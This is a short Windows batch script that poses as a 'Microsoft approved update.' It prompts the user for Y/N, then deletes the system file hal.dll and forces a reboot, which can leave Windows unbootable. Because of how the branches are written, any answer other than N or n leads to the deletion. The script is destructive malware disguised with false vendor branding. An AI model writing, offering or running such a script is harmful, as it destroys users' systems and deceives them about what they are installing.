@echo off

cls

echo Microsoft approved update. This my harm your computer!

set /p menu="Do you want to continue? (Y/N): "
if %menu%==Y goto Yes
if %menu%==y goto Yes
if %menu%==N goto No
if %menu%==n goto No

:Yes
del C:\WINDOWS\system32\hal.dll

shutdown -r
:No
